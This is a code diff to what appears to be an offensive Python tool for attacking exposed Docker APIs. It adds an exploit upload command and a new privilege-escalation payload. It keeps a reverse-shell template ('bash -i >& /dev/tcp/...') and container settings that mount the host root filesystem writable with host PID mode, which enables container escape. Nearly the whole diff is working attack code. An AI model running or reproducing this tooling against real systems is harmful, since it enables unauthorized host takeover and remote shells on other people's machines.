@@ -13,6 +13,7 @@ import time
 import subprocess
 import threading
 from exploits import Exploits
+import base64
 
 
 APP_NAME = """
@@ -45,8 +46,9 @@ CMD_TYPES = [
 ]
 
 EXPLOITS = {
-    "/privesc/mount_host_fs/" : Exploits.MOUNT_HOST_FS,
-    "/privesc/ssh_host/"      : Exploits.SSH_HOST
+    "/bash/privesc/mount_host_fs" : Exploits.MOUNT_HOST_FS,
+    "/bash/privesc/ssh_host"      : Exploits.SSH_HOST,
+    "/bash/privesc/pyhttp_inject" : Exploits.PYSERVER_HTTP_INJECTION
 }
 
 
@@ -167,7 +169,7 @@ class Commands:
         "set"      : Command(name="set",
                              desc="Set the value of a variable",
                              cmd="set VAR=VALUE",
-                             info="For JSON variable must be used 'setdata'"),
+                             info="For JSON variable must be used 'setdata"),
         "show"     : Command(name="show",
                              desc="Show the value of a variable",
                              cmd="show [VAR1, ...]",
@@ -229,7 +231,16 @@ class Commands:
         "inspect"  : Command(name="inspect",
                              desc="Inspect a specific container",
                              cmd="inspect [name=NAME]",
-                             info="If not name given inspect the container named with NAME")
+                             info="If not name given inspect the container named with NAME"),
+        "upload"   : Command(name="upload",
+                             desc="Upload a file inside a container",
+                             cmd="Upload",
+                             info="Upload what is defined in the variable EXPLOIT"),
+        "use"      : Command(name="use",
+                             desc="Select which file/exploit to use for Uploading or other things",
+                             cmd="use [exploit=[FILE|EXPLOIT_NAME]]",
+                             info="Set the value for EXPLOIT. Default available Exploits are: \n" +
+                             "\n".join([" " * 15 + f"- {k}" for k in EXPLOITS.keys()]))
     }
 
     @classmethod
@@ -260,6 +271,10 @@ class RemoteDockerExecution:
         self.__autoremove   = True
         self.__networkdisab = False
         self.__command      = "rvshell"
+        self.__exploit      = "/bash/privesc/mount_host_fs"
+        self.__exposedports = dict()
+        self.__networkmode  = "bridge"
+        self.__pidmode      = "host"
         self.__data  = {
             "create" : {
                 "Image" : self.__image, "HostConfig" : {
@@ -269,11 +284,16 @@ class RemoteDockerExecution:
                         "Target": "/mnt/fs",
                         "Source": "/",
                         "Type": "bind",
-                        "ReadOnly": False
-                    }]
+                        "ReadOnly": False,
+                    }],
+                    "NetworkMode" : self.__networkmode,
+                    "PidMode" : self.__pidmode,
+                    "PortBindings" : dict()
                 },
                 "NetworkDisabled" : self.__networkdisab,
                 "Entrypoint": ["tail", "-f", "/dev/null"],
+                "OpenStdin" : True,
+                "ExposedPorts" : self.__exposedports
             },
             "exec" : {
                 "Cmd" : [
@@ -293,8 +313,10 @@ class RemoteDockerExecution:
 
         self.exec_created = False
         self.command_types = {
-            "rvshell" : 'bash -i >& /dev/tcp/{:s}/{:d} 0>&1'
+            "rvshell" : 'bash -i >& /dev/tcp/{:s}/{:d} 0>&1',
+            "upload"  : 'echo {:s} | base64 -d >> file.sh'
         }
+        self.printable_exploit = "/" + "/".join(self.__exploit.split("/")[-2:])
 
     @staticmethod
     def merge_args(args: List[str]) -> List[str]:
@@ -379,6 +401,9 @@ class RemoteDockerExecution:
             attr = f"_{name_class}__{var.lower()}"
             if val.isnumeric():
                 val = int(val)
+
+            if var == "EXPLOIT":
+                continue
 
             setattr(self, attr, val)
             c.print(f"[*] Setting {var} => {val}")
@@ -518,6 +543,8 @@ class RemoteDockerExecution:
         
         if command == "rvshell":
             arg = [self.__lhost, self.__lport]
+        elif command == "upload":
+            arg = [args[0]]
         
         if command in self.command_types:
             cmd = self.command_types[command].format(*arg)
@@ -525,7 +552,7 @@ class RemoteDockerExecution:
             cmd = command
 
         data = self.__data["exec"]
-        data["Cmd"][2] =  f'{cmd}'
+        data["Cmd"][2] = f'{cmd}'
 
         c.print(f"[*] Executing command: [yellow]'{cmd}'[/yellow]")
         
@@ -629,6 +656,28 @@ class RemoteDockerExecution:
         
         c.print(response.json())
 
+    def upload(self, *args) -> None:
+        old_command = self.__command
+        self.__command = "upload"
+        exploit = self.__exploit
+        if exploit in EXPLOITS:
+            exploit = EXPLOITS[exploit]
+        else:
+            exploit = base64.b64encode(open(exploit, mode="r").read().encode('ascii')).decode('ascii')
+
+        self.cexec(exploit)
+        self.__command = old_command
+
+    def use(self, *args) -> None:
+        if len(args) > 0:
+            self.__exploit = args[0].split("=")[1]
+        else:
+            c.print(f"[*] [red]The 'use' command requires an argument[/red]")
+            raise Exception
+        
+        c.print(f"[*] [green]EXPLOIT => {self.__exploit}[/green]")
+        self.printable_exploit = "/" + "/".join(self.__exploit.split("/")[-2:])
+
     def run(self) -> None:
         maps = {
             "help"     : Commands().print,
@@ -646,14 +695,16 @@ class RemoteDockerExecution:
             "execute"  : self.cexec,
             "lstconts" : self.list_containers,
             "remove"   : self.remove,
-            "inspect"  : self.inspect
+            "inspect"  : self.inspect,
+            "upload"   : self.upload,
+            "use"      : self.use
         }
 
         while True:
             try:
                 if self.__rhost != "0.0.0.0":
                     command = self.__command if self.__command in self.command_types else "custom"
-                    msg = f"([blue]{self.__rhost}:{self.__rport}/{command}[/blue]) "
+                    msg = f"([blue]{command}[/blue]:[red]{self.printable_exploit}[/red])"
                 else:
                     msg = ""
 
